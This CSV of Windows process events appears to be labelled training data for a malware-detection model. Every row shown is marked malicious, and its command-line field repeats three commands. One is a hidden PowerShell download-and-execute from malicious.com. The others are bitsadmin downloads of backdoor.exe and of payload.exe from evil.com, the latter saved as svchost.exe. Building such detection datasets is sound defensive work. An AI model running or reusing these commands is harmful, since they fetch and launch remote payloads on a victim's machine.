event_id,timestamp,process_name,command_line,parent_image,user,integrity_level,label,occurrence_count,weight,hour_of_day,day_of_week,is_weekend,is_business_hours,event_sequence_id,events_in_last_hour,events_in_last_day,parent_is_same,has_unusual_parent,process_path_depth,is_system_path,is_user_path
1,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe  -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1') ,C:\Windows\System32\cmd.exe,MrX\adity,High,1,27,0.037037037037037035,,,0.0,0.0,3463,0,0,0.0,0.0,5,1.0,0.0
1,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe  -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1') ,C:\Windows\System32\cmd.exe,MrX\adity,High,1,27,0.037037037037037035,,,0.0,0.0,3464,0,0,0.0,0.0,5,1.0,0.0
1,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe  -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1') ,C:\Windows\System32\cmd.exe,MrX\adity,High,1,27,0.037037037037037035,,,0.0,0.0,3465,0,0,0.0,0.0,5,1.0,0.0
1,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe-NoProfile-ExecutionPolicy Bypass-WindowStyle Hidden-Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1') ,C:\Windows\System32\cmd.exe,MrX\adity,High,1,3,0.3333333333333333,,,0.0,0.0,3466,0,0,0.0,0.0,5,1.0,0.0
1,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe  -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1') ,C:\Windows\System32\cmd.exe,MrX\adity,High,1,27,0.037037037037037035,,,0.0,0.0,3467,0,0,0.0,0.0,5,1.0,0.0
1,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe  -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1') ,C:\Windows\System32\cmd.exe,MrX\adity,High,1,27,0.037037037037037035,,,0.0,0.0,3468,0,0,0.0,0.0,5,1.0,0.0
1,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe  -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1') ,C:\Windows\System32\cmd.exe,MrX\adity,High,1,27,0.037037037037037035,,,0.0,0.0,3469,0,0,0.0,0.0,5,1.0,0.0
1,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe  -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1') ,C:\Windows\System32\cmd.exe,MrX\adity,High,1,27,0.037037037037037035,,,0.0,0.0,3470,0,0,0.0,0.0,5,1.0,0.0
1,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe  -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1') ,C:\Windows\System32\cmd.exe,MrX\adity,High,1,27,0.037037037037037035,,,0.0,0.0,3471,0,0,0.0,0.0,5,1.0,0.0
1,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe  -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1') ,C:\Windows\System32\cmd.exe,MrX\adity,High,1,27,0.037037037037037035,,,0.0,0.0,3472,0,0,0.0,0.0,5,1.0,0.0
1,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe  -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1') ,C:\Windows\System32\cmd.exe,MrX\adity,High,1,27,0.037037037037037035,,,0.0,0.0,3473,0,0,0.0,0.0,5,1.0,0.0
1,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe  -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1') ,C:\Windows\System32\cmd.exe,MrX\adity,High,1,27,0.037037037037037035,,,0.0,0.0,3474,0,0,0.0,0.0,5,1.0,0.0
1,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe  -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1') ,C:\Windows\System32\cmd.exe,MrX\adity,High,1,27,0.037037037037037035,,,0.0,0.0,3475,0,0,0.0,0.0,5,1.0,0.0
1,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe-NoProfile-ExecutionPolicy Bypass-WindowStyle Hidden-Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1') ,C:\Windows\System32\cmd.exe,MrX\adity,High,1,3,0.3333333333333333,,,0.0,0.0,3476,0,0,0.0,0.0,5,1.0,0.0
1,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe  -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1') ,C:\Windows\System32\cmd.exe,MrX\adity,High,1,27,0.037037037037037035,,,0.0,0.0,3477,0,0,0.0,0.0,5,1.0,0.0
1,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe  -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1') ,C:\Windows\System32\cmd.exe,MrX\adity,High,1,27,0.037037037037037035,,,0.0,0.0,3478,0,0,0.0,0.0,5,1.0,0.0
1,,C:\Windows\System32\backgroundTaskHost.exe,"""C:\WINDOWS\system32\backgroundTaskHost.exe"" -ServerName:WindowsBackup.AppXnn6fnh4raxtmg45ba8k2f4ykb7n0k3y4.mca",C:\Windows\System32\svchost.exe,MrX\adity,Medium,1,2,0.5,,,0.0,0.0,3479,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3480,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3481,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3482,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3483,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3484,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3485,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3486,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3487,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3488,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3489,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3490,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3491,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3492,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3493,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3494,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3495,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3496,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3497,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3498,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3499,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3500,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3501,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3502,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3503,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3504,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3505,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3506,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3507,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3508,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3509,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3510,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3511,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /create download /download /priority normal http://malicious.com/backdoor.exe $env:TEMP\update.exe ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,34,0.029411764705882353,,,0.0,0.0,3512,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3513,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3514,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3515,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3516,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3517,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3518,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3519,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3520,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3521,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3522,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3523,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3524,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3525,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3526,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3527,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3528,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3529,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3530,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,1,1.0,,,0.0,0.0,3531,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3532,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3533,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3534,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3535,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3536,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3537,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3538,0,0,0.0,0.0,3,1.0,0.0
1,,C:\Windows\System32\bitsadmin.exe,"""C:\WINDOWS\system32\bitsadmin.exe"" /transfer download http://evil.com/payload.exe $env:TEMP\svchost.exe /download /priority high ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,MrX\adity,High,1,33,0.030303030303030304,,,0.0,0.0,3539,0,0,0.0,0.0,3,1.0,0.0
